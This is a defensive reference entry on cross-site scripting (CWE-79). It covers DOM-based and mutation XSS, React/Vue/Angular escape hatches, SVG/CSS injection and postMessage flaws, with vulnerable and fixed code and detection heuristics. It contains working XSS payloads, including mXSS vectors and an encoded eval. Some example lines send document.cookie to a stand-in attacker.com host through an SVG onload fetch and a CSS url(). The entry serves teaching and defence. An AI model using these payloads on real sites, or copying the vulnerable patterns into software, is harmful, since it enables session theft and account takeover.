---
description: "CWE-79: Attacker-controlled data inserted into DOM/HTML without escaping. Deep entry: DOM XSS, mXSS, framework escape hatches, SVG/CSS injection, postMessage."
date: 2026-04-16
tags: [security, cwe, xss, dom-xss, mxss, javascript, react, vue, angular, frontend]
level: Advanced
---

# CWE-79: Cross-Site Scripting (XSS)

**CWE-79** | OWASP Top 10 A03:2021 | Rank 1 in CWE Top 25 (Vul-RAG Deep Entry)

## Functional Semantics

XSS injects attacker-controlled script into a victim's browser execution context, granting full same-origin capabilities: cookie theft, session hijacking, keylogging, DOM manipulation, credential harvesting, browser-as-pivot. Three sub-types differ in persistence and execution path, not in impact:

- **Reflected** — payload echoed in immediate response; requires victim to visit attacker URL
- **Stored** — payload persisted (DB, log, profile field) and rendered for other users
- **DOM-based** — no server involvement; client-side JS reads attacker data from URL/postMessage and writes it to DOM

This entry focuses on non-trivial vectors: DOM XSS, mutation XSS, framework escape hatches, SVG/CSS injection, and postMessage attacks.

## Root Cause

The browser's HTML parser does not distinguish between markup from the application and markup from user data. Any user-controlled string inserted into an HTML context without context-aware escaping becomes executable.

Three failure modes:
1. **Missing escaping** — raw string interpolated into HTML
2. **Wrong escaping** — HTML-escaped string placed in JavaScript context (JS requires JS string escaping, not `&amp;`)
3. **Escaping bypass** — user input passes through a transformation that re-introduces executable syntax (mutation XSS)

## DOM-Based XSS

No server reflection required. The source is a browser API; the sink is a DOM manipulation function.

**Sources** (attacker-controlled DOM data):
- `location.hash`, `location.search`, `location.href`
- `document.referrer`
- `window.name`
- `postMessage` data
- `localStorage`/`sessionStorage` if previously poisoned
- `document.cookie` (if app writes cookie from URL param)

**Sinks** (code execution on assignment):
- `element.innerHTML = ...`
- `element.outerHTML = ...`
- `document.write(...)`
- `document.writeln(...)`
- `eval(...)`, `new Function(...)`
- `setTimeout("string")`, `setInterval("string")`
- `element.insertAdjacentHTML(...)`
- `DOMParser.parseFromString(..., "text/html")` then inserted
- jQuery: `$(selector).html(...)`, `$.parseHTML()`

```javascript
// VULNERABLE: source = location.hash, sink = innerHTML
// Attack URL: https://example.com/page#<img src=x onerror=alert(1)>
const param = decodeURIComponent(location.hash.slice(1));
document.getElementById("welcome").innerHTML = "Hello " + param;

// VULNERABLE: source = postMessage, sink = innerHTML (no origin check)
window.addEventListener("message", (e) => {
    document.getElementById("content").innerHTML = e.data.html;
});

// VULNERABLE: source = URL param, sink = eval
const fn = new URLSearchParams(location.search).get("callback");
eval(fn + "()"); // attacker: ?callback=alert(document.cookie)
```

```javascript
// FIXED: DOM XSS — use textContent (no HTML parsing) for text; DOMPurify for HTML
const param = decodeURIComponent(location.hash.slice(1));
document.getElementById("welcome").textContent = "Hello " + param; // safe

// FIXED: postMessage with origin validation and sanitization
window.addEventListener("message", (e) => {
    if (e.origin !== "https://trusted-partner.com") return;
    const clean = DOMPurify.sanitize(e.data.html); // allowlist-based sanitization
    document.getElementById("content").innerHTML = clean;
});
```

## Mutation XSS (mXSS)

mXSS occurs when a sanitized string is re-parsed by the browser's HTML parser and the mutation produces executable markup. The sanitizer sees safe HTML; after insertion and reparsing, the browser reconstructs a different, executable DOM.

**Classic mXSS vector — namespace confusion:**

```html
<!-- Input after DOMPurify (old versions): appears safe -->
<svg><p id="<img src=x onerror=alert(1)>"></p></svg>

<!-- Browser re-parses and extracts img from SVG namespace context:
     The parser's state machine treats the SVG content differently,
     causing the id attribute content to become an img element -->
```

**noscript mXSS:**
```html
<!-- When JS is enabled, <noscript> content is not parsed as HTML.
     Sanitizer parses without JS → sees text node inside noscript → passes.
     Browser with JS enabled → parses noscript differently in some contexts. -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

**Mitigation:** Keep sanitization libraries updated (DOMPurify 3.x resolved many mXSS vectors). Apply sanitization at insertion time (`innerHTML = DOMPurify.sanitize(html)`), not at storage time — storage-time sanitization is invalidated by library updates.

## Framework Escape Hatches

Frameworks provide safe defaults but expose explicit bypasses for "legitimate" HTML insertion.

### React — dangerouslySetInnerHTML

```jsx
// VULNERABLE: user-controlled description rendered as HTML
function PostBody({ post }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: post.description }} />
    );
}

// FIXED: sanitize before insertion
import DOMPurify from "dompurify";

function PostBody({ post }) {
    const clean = DOMPurify.sanitize(post.description, {
        ALLOWED_TAGS: ["p", "b", "i", "a", "ul", "li"],
        ALLOWED_ATTR: ["href", "target"]
    });
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**React-specific note:** JSX `{}` interpolation always escapes — `<div>{userInput}</div>` is safe. Only `dangerouslySetInnerHTML` and `javascript:` hrefs are sinks.

```jsx
// VULNERABLE: javascript: href
function Link({ url }) {
    return <a href={url}>Click</a>; // attacker: url = "javascript:alert(1)"
}

// FIXED: validate URL scheme
function Link({ url }) {
    const safe = /^https?:\/\//.test(url) ? url : "#";
    return <a href={safe}>Click</a>;
}
```

### Vue — v-html

```vue
<!-- VULNERABLE: v-html renders raw HTML -->
<template>
    <div v-html="userComment"></div>
</template>

<!-- FIXED: sanitize in computed property -->
<template>
    <div v-html="sanitizedComment"></div>
</template>

<script>
import DOMPurify from "dompurify";
export default {
    computed: {
        sanitizedComment() {
            return DOMPurify.sanitize(this.userComment);
        }
    }
}
</script>
```

### Angular — bypassSecurityTrust*

```typescript
// VULNERABLE: bypasses Angular's sanitization
import { DomSanitizer } from "@angular/platform-browser";

@Component({
    template: `<div [innerHTML]="trustedHtml"></div>`
})
export class ContentComponent {
    trustedHtml: SafeHtml;

    constructor(private sanitizer: DomSanitizer) {
        // bypassSecurityTrustHtml tells Angular not to sanitize
        this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(
            this.userInput // VULNERABLE if userInput is attacker-controlled
        );
    }
}

// FIXED: use Angular's built-in sanitization (default [innerHTML] behavior)
@Component({
    template: `<div [innerHTML]="userInput"></div>` // Angular sanitizes automatically
})
export class ContentComponent {
    userInput: string; // Angular's DomSanitizer strips script tags by default
}
```

## SVG and MathML Injection

SVG is valid HTML5 and executes script in the same origin when embedded:

```html
<!-- Stored as profile avatar URL or in rich text -->
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
</svg>

<!-- SVG event handlers — no <script> tag needed -->
<svg onload="fetch('https://attacker.com/?c='+document.cookie)">
    <animate attributeName="x" values="0;1" onbegin="eval(atob('YWxlcnQoMSk='))"/>
</svg>

<!-- MathML -->
<math><mtext><![CDATA[</mtext><script>alert(1)</script>]]></mtext></math>
```

**Detection:** File upload handlers that accept SVG without stripping `<script>` and event handlers. Content-Type sniffing by browsers if the server serves SVG as `text/plain` or `application/octet-stream` without `X-Content-Type-Options: nosniff`.

**Fix:** Either reject SVG uploads, or sanitize with a parser that strips script content (DOMPurify handles SVG; server-side: `svgo` with plugin `removeScripts`).

## CSS Injection

CSS injection is lower severity than script injection but still exploitable:

```html
<!-- Style injection via unescaped CSS value -->
<style>
    .user-theme { color: {{ userColor }}; }
</style>
<!-- attacker input: red; } body { background: url('//attacker.com/?c='+document.cookie+'; .x { -->
```

**Impact of CSS injection:**
- Exfiltrate data via `background: url()` or `font-face src` (CSS exfiltration)
- UI redressing / clickjacking overlay
- `expression()` (IE legacy) executed JS
- CSS `@import` of external stylesheet

**Fix:** Never interpolate user data into `<style>` blocks or `style=` attributes. Use CSS custom properties with validated values.

## PostMessage Without Origin Check

```javascript
// VULNERABLE: any window can send messages
window.addEventListener("message", (event) => {
    // Missing: if (event.origin !== "https://trusted.com") return;
    document.getElementById("panel").innerHTML = event.data;
});

// FIXED: strict origin allowlist
const ALLOWED_ORIGINS = new Set(["https://app.example.com", "https://widget.example.com"]);

window.addEventListener("message", (event) => {
    if (!ALLOWED_ORIGINS.has(event.origin)) return;
    // Also validate structure — event.data could be any type
    if (typeof event.data !== "object" || !event.data.type) return;
    handleMessage(event.data);
});
```

## Context-Specific Escaping Requirements

| Insertion Context | Required Escaping | Incorrect Approach |
|---|---|---|
| HTML body content | HTML entity encode (`&lt;`, `&gt;`, `&amp;`, `&quot;`) | None |
| HTML attribute value | HTML entity encode + quote attribute | HTML encode only (unquoted attrs) |
| JavaScript string | JS string escape (`\`, `"`, `'`, `\n`, `\r`) | HTML entity encode |
| JavaScript template literal | JS escape + backtick/`${` escape | HTML entity encode |
| CSS value | CSS hex encode | HTML entity encode |
| URL parameter | `encodeURIComponent()` | HTML entity encode |
| JSON in `<script>` | `</` → `<\/`, `<!--` → `<\!--` | Standard JSON only |

## Detection Heuristics

**Static analysis triggers:**
- `innerHTML`, `outerHTML`, `insertAdjacentHTML` with non-constant right-hand side
- `document.write(`, `document.writeln(` with variable arguments
- `eval(`, `new Function(`, `setTimeout(string`, `setInterval(string`
- `dangerouslySetInnerHTML={{ __html: expr }}` where expr is not a literal
- `v-html="expr"` where expr is not sanitized in computed property
- `bypassSecurityTrustHtml(`, `bypassSecurityTrustScript(`, `bypassSecurityTrustUrl(`
- `window.addEventListener("message", ...)` without origin check
- jQuery: `.html(expr)`, `.append(expr)` where expr is user-derived

**Data-flow triggers:**
- `location.hash`, `location.search`, `document.referrer` flowing into DOM sinks without escaping
- `postMessage` event.data flowing into innerHTML
- Database string retrieved in API response flowing client-side into innerHTML

**False positive indicators:**
- `innerHTML` set to a string literal in source code (no user-controlled data flow)
- `dangerouslySetInnerHTML` consuming output of DOMPurify.sanitize with strict allowlist
- Markdown renderer that outputs pre-sanitized HTML with a maintained allowlist (e.g., `marked` + `sanitize-html`)
- `eval()` applied to a JSON response from the application's own API over HTTPS — lower risk but still worth flagging (use `JSON.parse`)

## Gotchas

- **Sanitization at storage vs. render time:** Sanitizing on input and storing cleaned HTML means the sanitizer version is frozen. A later-discovered sanitizer bypass in old input affects all historical content. Sanitize at render time using the current library version.
- **Trusted types (browser API):** Chrome's Trusted Types API enforces that only designated "policies" can assign to innerHTML. Effective defense-in-depth; configure via `Content-Security-Policy: require-trusted-types-for 'script'`. Does not replace input sanitization.
- **CSP is not a primary fix:** `Content-Security-Policy: script-src 'self'` breaks many XSS attacks but is bypassed by: JSONP endpoints on allowed origins, Angular's `$compile`, CDN-hosted libraries. Use CSP as defense-in-depth, not primary control.
- **`javascript:` URIs in href/src/action:** HTML-escaping a URL does not prevent `javascript:alert(1)` from being an executable href. Validate scheme (`/^https?:/`) separately.
- **DOM clobbering:** HTML elements with `id` or `name` attributes shadow global JavaScript variables. `<img id="document">` can shadow `document.forms`, leading to prototype pollution paths. Sanitize id/name attributes in untrusted HTML.
- **Template injection in server-side templates vs. client-side XSS:** Jinja2 `{{ user_input }}` with auto-escaping is safe for HTML but vulnerable if user_input reaches an unescaped `{{ user_input | safe }}` — this is SSTI (CWE-1336), not XSS, but impact is RCE.

## See Also

- CWE-116: Improper Encoding — root cause: incorrect or missing output encoding
- CWE-352: Csrf — frequently combined: XSS defeats CSRF tokens stored in JS-accessible locations
- CWE-1336: Template Injection — server-side analog; similar data flow, higher impact (RCE)
- CWE-601: Open Redirect — often chained: redirect to attacker's XSS payload delivery page
